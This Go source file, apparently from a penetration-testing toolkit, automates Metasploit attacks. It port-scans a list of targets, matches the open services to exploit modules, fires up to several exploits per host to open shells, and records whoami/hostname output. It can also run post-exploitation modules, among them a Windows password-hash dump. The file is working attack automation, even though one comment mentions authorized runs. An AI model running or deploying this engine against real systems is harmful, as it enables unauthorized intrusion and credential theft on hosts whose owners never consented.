package autopwn

import (
	"context"
	"fmt"
	"log"
	"sort"
	"strings"
	"time"

	"github.com/Autumn-27/artex/msfrpc"
)

// MSF is the slice of *msfrpc.Client the engine depends on. Tests substitute a
// fake so the loop is verifiable without a live Metasploit.
type MSF interface {
	Version(context.Context) (string, error)
	Sessions(context.Context) (map[string]msfrpc.Session, error)
	ModuleInfo(context.Context, string, string) (map[string]any, error)
	RunConsole(context.Context, string, time.Duration, func(string, bool) bool) (string, error)
	SessionCommand(context.Context, string, string, string) (string, error)
}

// Options configures one automation run.
type Options struct {
	Targets     []string
	Ports       []int
	LHOST       string
	LPORT       int
	MaxExploits int           // per target, default 3
	ScanTimeout time.Duration // per port, default 2s
	WaitSession time.Duration // per attempt, default 25s
	Post        bool          // run post-exploitation modules on new sessions
	Evidence    bool          // collect whoami/hostname per session (default on)
	DryRun      bool          // scan + plan only, never touch a module
	Log         func(format string, args ...any)
}

func (o *Options) normalize() {
	if o.MaxExploits <= 0 || o.MaxExploits > 8 {
		o.MaxExploits = 3
	}
	if o.ScanTimeout <= 0 {
		o.ScanTimeout = 2 * time.Second
	}
	if o.WaitSession <= 0 || o.WaitSession > 120*time.Second {
		o.WaitSession = 25 * time.Second
	}
	if o.LPORT <= 0 {
		o.LPORT = 4444
	}
	if o.Log == nil {
		o.Log = log.Printf
	}
	seen := map[string]bool{}
	var targets []string
	for _, t := range o.Targets {
		t = strings.TrimSpace(t)
		if t == "" || seen[t] {
			continue
		}
		seen[t] = true
		targets = append(targets, t)
	}
	o.Targets = targets
}

// Attempt is one executed candidate.
type Attempt struct {
	Module   string        `json:"module"`
	Payload  string        `json:"payload,omitempty"`
	Port     int           `json:"port"`
	Rule     string        `json:"rule"`
	Duration time.Duration `json:"duration"`
	Output   string        `json:"output,omitempty"`
	Session  string        `json:"session,omitempty"`
	Error    string        `json:"error,omitempty"`
}

// SessionInfo is the evidence collected from a fresh session.
type SessionInfo struct {
	ID       string `json:"id"`
	Type     string `json:"type"`
	Peer     string `json:"peer,omitempty"`
	Via      string `json:"via,omitempty"`
	Username string `json:"username,omitempty"`
	Evidence string `json:"evidence,omitempty"`
}

// PostRun is one post-exploitation module execution.
type PostRun struct {
	Module  string `json:"module"`
	Session string `json:"session"`
	Output  string `json:"output,omitempty"`
	Error   string `json:"error,omitempty"`
}

// TargetResult is everything the loop learned and did for one target.
type TargetResult struct {
	Target     string        `json:"target"`
	Ports      []PortFinding `json:"ports"`
	Candidates []Candidate   `json:"candidates"`
	Attempts   []Attempt     `json:"attempts,omitempty"`
	Sessions   []SessionInfo `json:"sessions,omitempty"`
	Post       []PostRun     `json:"post,omitempty"`
	Note       string        `json:"note,omitempty"`
	Error      string        `json:"error,omitempty"`
}

// Summary is the machine-readable outcome of a run.
type Summary struct {
	Started    time.Time      `json:"started"`
	Finished   time.Time      `json:"finished"`
	MSFVersion string         `json:"msf_version,omitempty"`
	DryRun     bool           `json:"dry_run"`
	Results    []TargetResult `json:"results"`
}

// Sessions flattens every session across targets.
func (s *Summary) Sessions() []SessionInfo {
	var out []SessionInfo
	for _, r := range s.Results {
		out = append(out, r.Sessions...)
	}
	return out
}

// Engine drives scan → identify → match → exploit → post for a target list.
type Engine struct {
	msf  MSF
	opts Options
}

// New builds an engine; opts is normalized in place.
func New(msfClient MSF, opts Options) *Engine {
	opts.normalize()
	return &Engine{msf: msfClient, opts: opts}
}

// Options returns the normalized options (targets deduplicated, defaults filled).
func (e *Engine) Options() Options { return e.opts }

// Run walks every target. Per-target failures are recorded, never fatal: one
// unreachable host must not abort an authorized run.
func (e *Engine) Run(ctx context.Context) *Summary {
	sum := &Summary{Started: time.Now(), DryRun: e.opts.DryRun}
	if v, err := e.msf.Version(ctx); err == nil {
		sum.MSFVersion = v
		e.logf("[*] Metasploit %s", v)
	}
	for _, target := range e.opts.Targets {
		if ctx.Err() != nil {
			break
		}
		sum.Results = append(sum.Results, e.runTarget(ctx, target))
	}
	sum.Finished = time.Now()
	return sum
}

func (e *Engine) runTarget(ctx context.Context, target string) TargetResult {
	res := TargetResult{Target: target}
	e.logf("[*] [%s] 端口扫描（%d 个端口）", target, len(e.opts.Ports))

	findings := ScanTarget(ctx, target, e.opts.Ports, e.opts.ScanTimeout, 0)
	res.Ports = findings
	if len(findings) == 0 {
		res.Note = "无开放端口"
		e.logf("[!] [%s] 无开放端口", target)
		return res
	}
	open := make([]string, 0, len(findings))
	for _, f := range findings {
		label := fmt.Sprintf("%d/%s", f.Port, f.Service)
		if f.Product != "" {
			label += "(" + f.Product + ")"
		}
		open = append(open, label)
	}
	e.logf("[+] [%s] 开放：%s", target, strings.Join(open, ", "))

	res.Candidates = Match(target, findings, e.opts.LHOST, e.opts.LPORT)
	if len(res.Candidates) == 0 {
		res.Note = "开放端口未命中任何已知利用路径"
		e.logf("[!] [%s] 未命中候选模块", target)
		return res
	}
	e.logf("[+] [%s] 候选 %d 个（按置信度）：%s", target, len(res.Candidates), candidateNames(res.Candidates, e.opts.MaxExploits))
	if e.opts.DryRun {
		res.Note = "dry-run：只扫描与规划，未执行模块"
		return res
	}

	for i, c := range res.Candidates {
		if i >= e.opts.MaxExploits {
			res.Note = fmt.Sprintf("已达 max_exploits=%d", e.opts.MaxExploits)
			break
		}
		if ctx.Err() != nil {
			res.Note = "上下文取消"
			break
		}
		att := e.attempt(ctx, target, c)
		res.Attempts = append(res.Attempts, att)
		if att.Error != "" {
			e.logf("[!] [%s] %s 失败：%s", target, c.Module, att.Error)
			continue
		}
		if att.Session == "" {
			e.logf("[-] [%s] %s 未拿到会话", target, c.Module)
			continue
		}
		e.logf("[+] [%s] %s 拿到会话 %s", target, c.Module, att.Session)
		infos := e.collect(ctx, att.Session)
		res.Sessions = append(res.Sessions, infos...)
		if e.opts.Post {
			res.Post = append(res.Post, e.postExploit(ctx, target, att.Session)...)
		}
		break
	}
	return res
}

// attempt checks module availability, runs it on a console, and waits for a new
// session. A module that this MSF build does not ship is reported as
// module_missing instead of being retried blindly.
func (e *Engine) attempt(ctx context.Context, target string, c Candidate) Attempt {
	start := time.Now()
	att := Attempt{Module: c.Module, Payload: c.Payload, Port: c.Port, Rule: c.Rule}
	e.logf("[*] [%s] 尝试 %s（%s，端口 %d）", target, c.Module, c.Rule, c.Port)
	if _, err := e.msf.ModuleInfo(ctx, c.ModuleType, c.Module); err != nil {
		att.Error = "module_missing: " + err.Error()
		att.Duration = time.Since(start)
		return att
	}
	before := e.sessionIDs(ctx)
	script := ConsoleScript(c, e.opts.LHOST, e.opts.LPORT)
	out, err := e.msf.RunConsole(ctx, script, e.opts.WaitSession, func(o string, busy bool) bool {
		return !busy && strings.Contains(strings.ToLower(o), "session")
	})
	att.Output = tail(out, 1200)
	if err != nil {
		att.Error = err.Error()
		att.Duration = time.Since(start)
		return att
	}
	ids := waitNewSessions(ctx, e.msf, before, e.opts.WaitSession)
	if len(ids) > 0 {
		att.Session = ids[0]
	}
	att.Duration = time.Since(start)
	return att
}

func waitNewSessions(ctx context.Context, c MSF, before map[string]bool, wait time.Duration) []string {
	deadline := time.Now().Add(wait)
	for {
		list, err := c.Sessions(ctx)
		if err == nil {
			var got []string
			for id := range list {
				if !before[id] {
					got = append(got, id)
				}
			}
			if len(got) > 0 {
				sort.Strings(got)
				return got
			}
		}
		if time.Now().After(deadline) {
			return nil
		}
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(2 * time.Second):
		}
	}
}

func (e *Engine) sessionIDs(ctx context.Context) map[string]bool {
	out := map[string]bool{}
	list, err := e.msf.Sessions(ctx)
	if err != nil {
		return out
	}
	for id := range list {
		out[id] = true
	}
	return out
}

// collect runs the read-only evidence commands that make a session claim
// auditable (whoami/hostname), retrying so a slow shell still answers.
func (e *Engine) collect(ctx context.Context, id string) []SessionInfo {
	list, err := e.msf.Sessions(ctx)
	if err != nil {
		return []SessionInfo{{ID: id}}
	}
	s, ok := list[id]
	if !ok {
		return []SessionInfo{{ID: id}}
	}
	info := SessionInfo{ID: id, Type: s.Type, Peer: s.TunnelPeer, Via: s.ViaExploit, Username: s.Username}
	if !e.opts.Evidence {
		return []SessionInfo{info}
	}
	for attempt := 0; attempt < 6; attempt++ {
		var got []string
		for _, cmd := range []string{"whoami", "hostname"} {
			payload := cmd
			if s.Type != "meterpreter" {
				payload = cmd + "\r\n"
			}
			out, err := e.msf.SessionCommand(ctx, id, s.Type, payload)
			if err != nil {
				continue
			}
			if out = strings.TrimSpace(out); out != "" {
				got = append(got, out)
			}
		}
		if len(got) > 0 {
			info.Evidence = strings.Join(got, " | ")
			return []SessionInfo{info}
		}
		select {
		case <-ctx.Done():
			return []SessionInfo{info}
		case <-time.After(1500 * time.Millisecond):
		}
	}
	return []SessionInfo{info}
}

// PostModules are the read-only(ish) post modules run on a fresh session. They
// are best-effort: a module that errors is recorded, never retried.
var PostModules = []string{
	"post/multi/gather/env",
	"post/multi/recon/local_exploit_suggester",
}

// WindowsPostModules are added when the session reports a Windows host.
var WindowsPostModules = []string{
	"post/windows/gather/hashdump",
}

func (e *Engine) postExploit(ctx context.Context, target, id string) []PostRun {
	mods := append([]string{}, PostModules...)
	if typ := e.sessionType(ctx, id); typ == "meterpreter" {
		mods = append(mods, WindowsPostModules...)
	}
	var out []PostRun
	for _, mod := range mods {
		if _, err := e.msf.ModuleInfo(ctx, "post", mod); err != nil {
			out = append(out, PostRun{Module: mod, Session: id, Error: "module_missing"})
			continue
		}
		script := fmt.Sprintf("use %s\nset SESSION %s\nrun\n", mod, id)
		txt, err := e.msf.RunConsole(ctx, script, 30*time.Second, nil)
		run := PostRun{Module: mod, Session: id, Output: tail(txt, 800)}
		if err != nil {
			run.Error = err.Error()
		}
		out = append(out, run)
		e.logf("[*] [%s] 后渗透 %s 完成", target, mod)
	}
	return out
}

func (e *Engine) sessionType(ctx context.Context, id string) string {
	if list, err := e.msf.Sessions(ctx); err == nil {
		if s, ok := list[id]; ok {
			return s.Type
		}
	}
	return ""
}

func (e *Engine) logf(format string, args ...any) { e.opts.Log(format, args...) }

func candidateNames(cs []Candidate, limit int) string {
	var out []string
	for i, c := range cs {
		if i >= limit {
			out = append(out, "…")
			break
		}
		out = append(out, c.Module)
	}
	return strings.Join(out, " > ")
}

func tail(s string, n int) string {
	s = strings.TrimSpace(s)
	if len(s) <= n {
		return s
	}
	return "…" + s[len(s)-n:]
}
